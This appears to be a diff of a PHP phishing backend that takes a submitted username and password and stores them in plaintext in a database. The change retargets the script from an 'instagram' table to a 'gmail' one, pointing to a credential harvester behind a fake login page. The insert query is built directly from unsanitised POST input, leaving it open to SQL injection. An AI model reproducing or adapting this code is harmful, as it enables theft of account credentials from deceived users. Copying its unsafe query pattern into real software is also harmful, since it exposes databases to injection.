@@ -14,10 +14,10 @@
   if($con)
  {
 //echo "Mysql connection ok..!<br>";
-mysqli_select_db($con,"instagram");
+mysqli_select_db($con,"gmail");
 $Uname = strval($_POST['Uname']);
 $pass = strval($_POST['pass']);
-$insert = "insert into instagram values('$Uname','$pass')";
+$insert = "insert into gmail values('$Uname','$pass')";
 if(mysqli_query($con,$insert))
 {
 echo "Your have entered!<br>";
